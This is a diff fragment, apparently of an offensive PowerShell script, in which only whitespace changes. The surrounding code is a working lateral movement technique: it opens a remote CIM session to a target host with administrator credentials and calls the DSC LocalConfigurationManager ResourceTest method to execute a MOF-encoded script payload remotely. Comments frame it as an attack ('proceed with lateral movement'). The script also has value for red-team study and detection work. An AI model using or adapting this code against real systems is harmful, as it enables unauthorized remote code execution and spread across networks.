@@ -25,7 +25,7 @@ instance of MSFT_ScriptResource as $MSFT_ScriptResource1ref
 	ModuleVersion = "1.0";
 	ConfigurationName = "ScriptTest";
 };
- 
+
 instance of OMI_ConfigurationDocument
 {
 	Version="2.0.0";
@@ -40,11 +40,11 @@ instance of OMI_ConfigurationDocument
 
 # Change this to false if you want to test the payload locally
 $ExecuteRemotely = $True
- 
+
 $NormalizedMOFContents = [Text.Encoding]::UTF8.GetString([Text.Encoding]::ASCII.GetBytes($MOFContents))
 $NormalizedMOFBytes = [Text.Encoding]::UTF8.GetBytes($NormalizedMOFContents)
 $TotalSize = [BitConverter]::GetBytes($NormalizedMOFContents.Length + 4)
- 
+
 if ($ExecuteRemotely) {
 	# Prepend the length of the payload
 	[Byte[]] $MOFBytes = $TotalSize + $NormalizedMOFBytes
@@ -57,21 +57,21 @@ if ($ExecuteRemotely) {
 # Specify the credentials of your target
 $Credential = Get-Credential -Credential "offense\administrator"
 $ComputerName = 'ws02'
- 
+
 # Establish a remote WMI session with the target system
 $RemoteCIMSession = New-CimSession -ComputerName $ComputerName -Credential $Credential
- 
+
 $LCMClass = Get-CimClass -Namespace root/Microsoft/Windows/DesiredStateConfiguration -ClassName MSFT_DSCLocalConfigurationManager -CimSession $RemoteCIMSession
- 
+
 if ($LCMClass -and $LCMClass.CimClassMethods['ResourceTest']) {
 	# You may now proceed with lateral movement
- 
+
 	$MethodArgs = @{
     	ModuleName   	= 'PSDesiredStateConfiguration'
     	ResourceType 	= 'MSFT_ScriptResource'
     	resourceProperty = $MOFBytes
 	}
- 
+
 	$Arguments = @{
     	Namespace  = 'root/Microsoft/Windows/DesiredStateConfiguration'
     	ClassName  = 'MSFT_DSCLocalConfigurationManager'
@@ -79,11 +79,11 @@ if ($LCMClass -and $LCMClass.CimClassMethods['ResourceTest']) {
     	Arguments  = $MethodArgs
     	CimSession = $RemoteCIMSession
 	}
- 
+
 	# Invoke the DSC script resource Test method
 	# Successful execution will be indicated by "InDesiredState" returning True and ReturnValue returning 0.
 	Invoke-CimMethod @Arguments
- 
+
 } else {
 	Write-Warning 'The DSC lateral movement method is not available on the remote system.'
 }
